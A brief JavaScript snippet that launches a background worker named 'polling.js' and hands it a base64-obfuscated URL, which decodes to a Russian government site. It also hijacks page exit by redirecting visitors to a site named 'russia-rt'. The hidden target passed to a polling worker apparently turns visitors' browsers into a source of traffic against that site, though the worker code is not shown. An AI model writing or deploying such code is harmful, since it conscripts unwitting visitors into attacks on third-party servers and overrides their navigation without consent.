var pollingWorker = new Worker('polling.js');
pollingWorker.postMessage('aHR0cHM6Ly9uc3VkLmluZm8uZ292LnJ1Lw==');

window.onbeforeunload = function () {
  console.log(11111);
  window.location = 'https://russia-rt.netlify.app/';
}